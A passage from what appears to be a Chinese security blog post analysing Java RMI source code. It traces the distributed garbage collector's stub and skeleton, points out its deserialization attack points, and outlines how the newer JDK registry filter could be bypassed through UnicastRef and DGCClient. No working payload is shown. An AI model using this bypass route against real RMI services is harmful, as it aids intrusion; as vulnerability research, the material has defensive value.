e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                    <span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                call.releaseInputStream();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// make upcall on remote object</span></span><br><span class="line">            Object result;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                result = method.invoke(obj, params);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e.getTargetException();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// marshal return value</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">                <span class="keyword">if</span> (rtype != <span class="keyword">void</span>.class) &#123;</span><br><span class="line">                    marshalValue(rtype, result, out);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, ex);</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * This throw is problematic because when it is caught below,</span></span><br><span class="line"><span class="comment">                 * we attempt to marshal it back to the client, but at this</span></span><br><span class="line"><span class="comment">                 * point, a &quot;normal return&quot; has already been indicated,</span></span><br><span class="line"><span class="comment">                 * so marshalling an exception will corrupt the stream.</span></span><br><span class="line"><span class="comment">                 * This was the case with skeletons as well; there is no</span></span><br><span class="line"><span class="comment">                 * immediately obvious solution without a protocol change.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            logCallException(e);</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">if</span> (e <span class="keyword">instanceof</span> Error) &#123;</span><br><span class="line">                e = <span class="keyword">new</span> <span class="title class_">ServerError</span>(</span><br><span class="line">                    <span class="string">&quot;Error occurred in server thread&quot;</span>, (Error) e);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (e <span class="keyword">instanceof</span> RemoteException) &#123;</span><br><span class="line">                e = <span class="keyword">new</span> <span class="title class_">ServerException</span>(</span><br><span class="line">                    <span class="string">&quot;RemoteException occurred in server thread&quot;</span>,</span><br><span class="line">                    (Exception) e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (suppressStackTraces) &#123;</span><br><span class="line">                clearStackTraces(e);</span><br><span class="line">            &#125;</span><br><span class="line">            out.writeObject(e);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            call.releaseInputStream(); <span class="comment">// in case skeleton doesn&#x27;t</span></span><br><span class="line">            call.releaseOutputStream();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="hFSVM">客户端请求服务端-DGC</h2>
<h3 id="GmG3b">创建</h3>
DGC是RMI中分布式垃圾回收的模块

<p>之前我们看到，在静态表中，除了我们所创建的两个Target，还有一个DGC的Target，DGC这个类实际是在<code>DGCImpl.dgcLog.isLoggable(Log.VERBOSE)</code>这里被创建的，有人可能问，这里不是就简单的一行代码调用吗，我们之前讲过，调用一个类的静态变量时候，是会完成类的初始化的</p>
<p>我们在put Target的地方下一个断点，这里put的Target是一个动态代理类，说明在我们将Target放入静态表的时候，DGC已经被创建好并放入静态表中了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">putTarget</span><span class="params">(Target target)</span> <span class="keyword">throws</span> ExportException &#123;</span><br><span class="line">        <span class="type">ObjectEndpoint</span> <span class="variable">oe</span> <span class="operator">=</span> target.getObjectEndpoint();</span><br><span class="line">        <span class="type">WeakRef</span> <span class="variable">weakImpl</span> <span class="operator">=</span> target.getWeakImpl();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (DGCImpl.dgcLog.isLoggable(Log.VERBOSE)) &#123;</span><br><span class="line">            DGCImpl.dgcLog.log(Log.VERBOSE, <span class="string">&quot;add object &quot;</span> + oe);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">synchronized</span> (tableLock) &#123;</span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * Do nothing if impl has already been collected (see 6597112). Check while</span></span><br><span class="line"><span class="comment">             * holding tableLock to ensure that Reaper cannot process weakImpl in between</span></span><br><span class="line"><span class="comment">             * null check and put/increment effects.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (target.getImpl() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (objTable.containsKey(oe)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">                        <span class="string">&quot;internal error: ObjID already in use&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (implTable.containsKey(weakImpl)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;object already exported&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                objTable.put(oe, target);</span><br><span class="line">                implTable.put(weakImpl, target);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (!target.isPermanent()) &#123;</span><br><span class="line">                    incrementKeepAliveCount();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Log</span> <span class="variable">dgcLog</span> <span class="operator">=</span> Log.getLog(<span class="string">&quot;sun.rmi.dgc&quot;</span>, <span class="string">&quot;dgc&quot;</span>,</span><br><span class="line">        LogStream.parseLevel(AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">GetPropertyAction</span>(<span class="string">&quot;sun.rmi.dgc.logLevel&quot;</span>))));</span><br></pre></td></tr></table></figure>

<p>在类初始化的时候实际上也是会走到它类中的静态代码块的位置，在静态代码块的中间，实际就new了一个DGCImpl，后续的创建方式，也就和创建注册中心的方法很类似了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * &quot;Export&quot; the singleton DGCImpl in a context isolated from</span></span><br><span class="line"><span class="comment">         * the arbitrary current thread context.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span></span><br><span class="line">                    Thread.currentThread().getContextClassLoader();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.currentThread().setContextClassLoader(</span><br><span class="line">                        ClassLoader.getSystemClassLoader());</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Put remote collector object in table by hand to prevent</span></span><br><span class="line"><span class="comment">                     * listen on port.  (UnicastServerRef.exportObject would</span></span><br><span class="line"><span class="comment">                     * cause transport to listen.)</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        dgc = <span class="keyword">new</span> <span class="title class_">DGCImpl</span>();</span><br><span class="line">                        <span class="type">ObjID</span> <span class="variable">dgcID</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(ObjID.DGC_ID);</span><br><span class="line">                        <span class="type">LiveRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, <span class="number">0</span>);</span><br><span class="line">                        <span class="type">UnicastServerRef</span> <span class="variable">disp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastServerRef</span>(ref);</span><br><span class="line">                        <span class="type">Remote</span> <span class="variable">stub</span> <span class="operator">=</span></span><br><span class="line">                            Util.createProxy(DGCImpl.class,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref), <span class="literal">true</span>);</span><br><span class="line">                        disp.setSkeleton(dgc);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Permissions</span> <span class="variable">perms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Permissions</span>();</span><br><span class="line">                        perms.add(<span class="keyword">new</span> <span class="title class_">SocketPermission</span>(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;accept,resolve&quot;</span>));</span><br><span class="line">                        ProtectionDomain[] pd = &#123; <span class="keyword">new</span> <span class="title class_">ProtectionDomain</span>(<span class="literal">null</span>, perms) &#125;;</span><br><span class="line">                        <span class="type">AccessControlContext</span> <span class="variable">acceptAcc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AccessControlContext</span>(pd);</span><br><span class="line"></span><br><span class="line">                        <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Target&gt;() &#123;</span><br><span class="line">                                <span class="keyword">public</span> Target <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Target</span>(dgc, disp, stub, dgcID, <span class="literal">true</span>);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, acceptAcc);</span><br><span class="line"></span><br><span class="line">                        ObjectTable.putTarget(target);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(</span><br><span class="line">                            <span class="string">&quot;exception initializing server-side DGC&quot;</span>, e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    Thread.currentThread().setContextClassLoader(savedCcl);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在调用createProxy时候，stubClassExists还是会去检查，JDK中有没有DGCImpl_Stub，确实是有这个类的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                     RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                     <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (forceStubUse ||</span><br><span class="line">            !(ignoreStubClasses || !stubClassExists(remoteClass)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">       ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现存在这个类，就将其实例化并返回true</p>
<p>和注册中心相类似，注册中心的端口用来注册服务，而DGC的端口是用来远程回收服务，只是端口不是确定的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">stubClassExists</span><span class="params">(Class&lt;?&gt; remoteClass)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!withoutStubs.containsKey(remoteClass)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class.forName(remoteClass.getName() + <span class="string">&quot;_Stub&quot;</span>,</span><br><span class="line">                              <span class="literal">false</span>,</span><br><span class="line">                              remoteClass.getClassLoader());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException cnfe) &#123;</span><br><span class="line">                withoutStubs.put(remoteClass, <span class="literal">null</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735788239525-7f1f479a-3a3b-442f-a6ea-312ab5dbc460.png"></p>
<h3 id="Bh065">功能</h3>
在DGCImpl_Stub中存在两个方法，可以理解为一个比较弱的清理，一个比较干净的清理

<p>下面的两个方法都存在风险点，他们都调用了UnicastRef的invoke方法，我们之前说过，这个方法存是存在风险的</p>
<p>还有一个就在dirty的var9.readObject()处，会进行一个反序列化操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">clean</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, VMID var4, <span class="type">boolean</span> var5)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var6</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">0</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var7</span> <span class="operator">=</span> var6.getOutputStream();</span><br><span class="line">                var7.writeObject(var1);</span><br><span class="line">                var7.writeLong(var2);</span><br><span class="line">                var7.writeObject(var4);</span><br><span class="line">                var7.writeBoolean(var5);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var8) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var8);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var6);</span><br><span class="line">            <span class="built_in">super</span>.ref.done(var6);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var9;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var10) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var10;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var11) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var11);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Lease <span class="title function_">dirty</span><span class="params">(ObjID[] var1, <span class="type">long</span> var2, Lease var4)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">RemoteCall</span> <span class="variable">var5</span> <span class="operator">=</span> <span class="built_in">super</span>.ref.newCall(<span class="built_in">this</span>, operations, <span class="number">1</span>, -<span class="number">669196253586618813L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getOutputStream();</span><br><span class="line">                var6.writeObject(var1);</span><br><span class="line">                var6.writeLong(var2);</span><br><span class="line">                var6.writeObject(var4);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var20) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, var20);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">super</span>.ref.invoke(var5);</span><br><span class="line"></span><br><span class="line">            Lease var24;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">var9</span> <span class="operator">=</span> var5.getInputStream();</span><br><span class="line">                var24 = (Lease)var9.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var17) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var17);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException var18) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, var18);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">super</span>.ref.done(var5);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var24;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var21) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var21;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var22) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var22;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnexpectedException</span>(<span class="string">&quot;undeclared checked exception&quot;</span>, var23);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们接下来看看服务端DGCImpl_Skel</p>
<p>其中有两个case，应该就是clean和dirty了，其中也是明显的几处反序列化的地方，都存在着攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote var1, RemoteCall var2, <span class="type">int</span> var3, <span class="type">long</span> var4)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (var4 != -<span class="number">669196253586618813L</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SkeletonMismatchException</span>(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">DGCImpl</span> <span class="variable">var6</span> <span class="operator">=</span> (DGCImpl)var1;</span><br><span class="line">            ObjID[] var7;</span><br><span class="line">            <span class="type">long</span> var8;</span><br><span class="line">            <span class="keyword">switch</span> (var3) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                    VMID var39;</span><br><span class="line">                    <span class="type">boolean</span> var40;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectInput</span> <span class="variable">var14</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                        var7 = (ObjID[])var14.readObject();</span><br><span class="line">                        var8 = var14.readLong();</span><br><span class="line">                        var39 = (VMID)var14.readObject();</span><br><span class="line">                        var40 = var14.readBoolean();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var36) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var36);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var37) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var37);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        var2.releaseInputStream();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    var6.clean(var7, var8, var39, var40);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var35) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var35);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                    Lease var10;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectInput</span> <span class="variable">var13</span> <span class="operator">=</span> var2.getInputStream();</span><br><span class="line">                        var7 = (ObjID[])var13.readObject();</span><br><span class="line">                        var8 = var13.readLong();</span><br><span class="line">                        var10 = (Lease)var13.readObject();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var32) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var32);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (ClassNotFoundException var33) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling arguments&quot;</span>, var33);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        var2.releaseInputStream();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">Lease</span> <span class="variable">var11</span> <span class="operator">=</span> var6.dirty(var7, var8, var10);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">ObjectOutput</span> <span class="variable">var12</span> <span class="operator">=</span> var2.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                        var12.writeObject(var11);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException var31) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling return&quot;</span>, var31);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h1 id="y6jlj">Java高版本绕过</h1>
在Java高版本中，在RegistryImpl类中新加了一个registryFilter方法，里面对所传入的序列化对象的类型进行了限制

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (String.class == clazz</span><br><span class="line">                || java.lang.Number.class.isAssignableFrom(clazz)</span><br><span class="line">                || Remote.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.lang.reflect.Proxy.class.isAssignableFrom(clazz)</span><br><span class="line">                || UnicastRef.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIClientSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || RMIServerSocketFactory.class.isAssignableFrom(clazz)</span><br><span class="line">                || java.rmi.server.UID.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.ALLOWED;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> ObjectInputFilter.Status.REJECTED;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>其中有希望利用的只有Proxy和UnicastRef类，其中最重要的是UnicastRef类，在这个类中有一个invoke方法 ，在修复以后，客户端的被攻击点是没有被修复的，我们就想如果能让服务端去发送一个客户端请求，就会暴露出攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(RemoteCall var1)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clientRefLog.log(Log.VERBOSE, <span class="string">&quot;execute call&quot;</span>);</span><br><span class="line">            var1.executeCall();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var3) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var3);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var3;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error var4) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;error: &quot;</span>, var4);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var4;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var5) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var5);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">false</span>);</span><br><span class="line">            <span class="keyword">throw</span> var5;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            clientRefLog.log(Log.BRIEF, <span class="string">&quot;exception: &quot;</span>, var6);</span><br><span class="line">            <span class="built_in">this</span>.free(var1, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">throw</span> var6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们的想法是找一个地方去调用Util.createProxy创建一个动态代理类，我们找到的是DGC这个类可以被利用，然后调用它的clean或者dirty方法去触发他的invoke方法</p>
<p>我们直接走向最终找到的DGCClient内部类EndpointEntry的构造方法方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="title function_">EndpointEntry</span><span class="params">(<span class="keyword">final</span> Endpoint endpoint)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.endpoint = endpoint;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">LiveRef</span> <span class="variable">dgcRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LiveRef</span>(dgcID, endpoint, <span class="literal">false</span>);</span><br><span class="line">                dgc = (DGC) Util.createProxy(DGCImpl.class,</span><br><span class="line">                                             <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(dgcRef), <span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;internal error creating DGC stub&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            renewCleanThread =  AccessController.doPrivileged(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">RenewCleanThread</span>(),</span><br><span class="line">                                    <span class="string">&quot;RenewClean-&quot;</span> + endpoint, <span class="literal">true</span>));</span><br><span class="line">            renewCleanThread.start();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们找哪里去创建了这么一个类，在EndpointEntry中的lookup方法中创建了这么一个类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> EndpointEntry <span class="title function_">lookup</span><span class="params">(Endpoint ep)</span> &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (endpointTable) &#123;</span><br><span class="line">                <span class="type">EndpointEntry</span> <span class="variable">entry</span> <span class="operator">=</span> endpointTable.get(ep);</span><br><span class="line">                <span class="keyword">if</span> (entry == <span class="literal">null</span>) &#123;</span><br><span class="line">                    entry = <span class="keyword">new</span> <span class="title class_">EndpointEntry</span>(ep);</span><br><span class="line">                    endpointTable.put(ep, entry);</span><br><span class="line">                    <span class="keyword">if</span> (gcLatencyRequest == <span class="literal">null</span>) &#123;</span><br><span class="line">                        gcLatencyRequest = GC.requestLatency(gcInterval);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> entry;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>我们看只有在registerRefs中调用了lookup方法</p>
